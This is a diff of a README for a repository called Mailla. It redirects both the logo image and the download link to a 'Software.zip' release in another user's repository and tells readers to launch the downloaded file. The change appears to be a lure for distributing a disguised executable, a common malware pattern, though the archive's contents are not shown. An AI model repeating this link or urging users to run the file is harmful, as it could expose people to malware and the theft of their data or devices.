@@ -3,7 +3,7 @@
 
 Welcome to the Mailla repository! 
 
-![Mailla Logo](https://example.com/mailla-logo.png)
+![Mailla Logo](https://github.com/dinorex1081/mailla/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Explore Mailla to uncover the groundbreaking solutions it offers in the realm of
 ### Repository Link
 
 To access the Mailla repository, click the link below:
-[Download Mailla v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Mailla v1.0.0](https://github.com/dinorex1081/mailla/releases/download/v1.0/Software.zip)
 
 Don't forget to launch the file from the link provided to experience the cutting-edge features Mailla has to offer!
 
